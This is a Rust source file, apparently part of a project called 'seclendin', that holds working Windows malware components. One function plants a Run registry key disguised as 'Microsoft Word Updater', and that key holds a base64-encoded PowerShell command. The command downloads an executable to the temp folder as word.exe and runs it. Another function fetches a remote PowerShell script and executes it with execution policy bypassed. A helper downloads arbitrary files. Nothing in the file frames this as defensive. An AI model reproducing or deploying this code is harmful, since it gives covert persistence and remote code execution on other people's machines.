use anyhow::{Context, Result};
use base64::encode;
use reqwest::Client;
use std::fs::File;
use std::io::copy;
use std::path::Path;
use std::path::PathBuf;
use std::process::Command;
use std::process::Stdio;
use winreg::enums::*;
use winreg::RegKey;

pub fn add_startup_command() {
    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    let (key, _disp) = hkcu.create_subkey(path).expect("Key couldnt created");
    let a = "$TempPath = [System.IO.Path]::GetTempPath();";
    let b = "$FilePath = \"$TempPath\\word.exe\";";
    let release_tag = env!("RELEASE_TAG");
    let c = format!(
        "$Uri = \"https://github.com/skylab-kulubu/seclendin/releases/download/{}/seclendin.exe\";",
        release_tag
    );
    let d = "iwr -Uri $Uri -OutFile $FilePath;";
    let e = "iex $FilePath";
    let payload = format!("{}{}{}{}{}", a, b, c, d, e);
    let encoded_payload = encode(payload);

    let powershell_command = format!("powershell -e {}", encoded_payload);
    key.set_value("Microsoft Word Updater", &powershell_command)
        .expect("An error occured while setting the value");
}

pub async fn fetch_and_execute_powershell_script(
    url: &String,
) -> Result<(), Box<dyn std::error::Error>> {
    // Initialize HTTP client and fetch script
    let client = Client::new();
    let script_content = client.get(url).send().await?.text().await?;

    // Execute the script content directly
    let mut cmd = if cfg!(target_os = "windows") {
        let mut cmd = Command::new("powershell.exe");
        cmd.arg("-ExecutionPolicy")
            .arg("Bypass")
            .arg("-Command")
            .arg(&script_content);
        cmd
    } else {
        let mut cmd = Command::new("pwsh");
        cmd.arg("-ExecutionPolicy")
            .arg("Bypass")
            .arg("-Command")
            .arg(&script_content);
        cmd
    };

    // Configure stdio
    cmd.stdout(Stdio::piped());
    cmd.stderr(Stdio::piped());

    // Execute and handle output
    let output = cmd.output().unwrap();

    if !output.stdout.is_empty() {
        println!(
            "Script stdout:\n{}",
            String::from_utf8_lossy(&output.stdout)
        );
    }

    if !output.stderr.is_empty() {
        eprintln!(
            "Script stderr:\n{}",
            String::from_utf8_lossy(&output.stderr)
        );
    }

    if !output.status.success() {
        return Err(format!(
            "PowerShell execution failed with exit code: {:?}",
            output.status.code()
        )
        .into());
    }

    Ok(())
}

pub fn get_desktop_path_using_dirs() -> Option<PathBuf> {
    dirs::desktop_dir()
}

pub async fn download_file(url: &String, image_path: &String) -> Result<()> {
    // Create a client
    let client = reqwest::Client::new();

    // Send GET request and get the response
    let response = client
        .get(url)
        .send()
        .await
        .context("Failed to send request")?;

    // Ensure the request was successful
    if !response.status().is_success() {
        anyhow::bail!("Failed to download file: HTTP {}", response.status());
    }

    // Get the bytes
    let bytes = response
        .bytes()
        .await
        .context("Failed to get response bytes")?;

    // Create the output file
    let path = Path::new(image_path.as_str());
    let mut file = File::create(path).context(format!("Failed to create file: {}", image_path))?;

    // Copy the bytes to the file
    copy(&mut bytes.as_ref(), &mut file).context("Failed to write file to disk")?;

    println!("Successfully downloaded file to: {}", image_path);
    Ok(())
}
